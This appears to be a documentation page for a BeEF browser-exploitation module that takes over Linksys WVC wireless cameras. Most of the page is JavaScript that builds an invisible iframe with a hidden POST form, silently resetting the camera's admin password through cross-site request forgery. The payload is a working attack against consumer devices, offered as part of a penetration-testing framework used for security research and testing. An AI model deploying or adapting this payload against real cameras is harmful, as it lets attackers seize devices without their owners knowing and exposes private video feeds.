## Summary

* **Objective**: change the admin password on a Linksys WVCseries wireless camera
* **Authors**: bcoles, n0x00
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/camera/linksys_wvc_wireless_camera_csrf)

## Internal Working

Uses invisible iframe with POST request to change config.

```js

  var gateway = '<%= @base %>';
  var path    = 'adm/file.cgi';
  var passwd  = '<%= @password %>';

  var linksys_wvc_iframe = beef.dom.createIframeXsrfForm(gateway + path, "POST", "application/x-www-form-urlencoded",
    [{'type':'hidden', 'name':'adm',            'value':'admin'},
     {'type':'hidden', 'name':'admpw',          'value':passwd},
     {'type':'hidden', 'name':'admpwv',         'value':passwd},
     {'type':'hidden', 'name':'language',       'value':'1'},
     {'type':'hidden', 'name':'h_usernamelist', 'value':''},
     {'type':'hidden', 'name':'h_language',     'value':'1'},
     {'type':'hidden', 'name':'h_lang_from_mac','value':''},
     {'type':'hidden', 'name':'this_file',      'value':'pass_wd.htm'},
     {'type':'hidden', 'name':'next_file',      'value':'pass_wd.htm'},
     {'type':'hidden', 'name':'todo',           'value':'save'},
     {'type':'hidden', 'name':'video_file',     'value':''},
     {'type':'hidden', 'name':'',               'value':'Submit form'}
    ]);
```

## Feedback
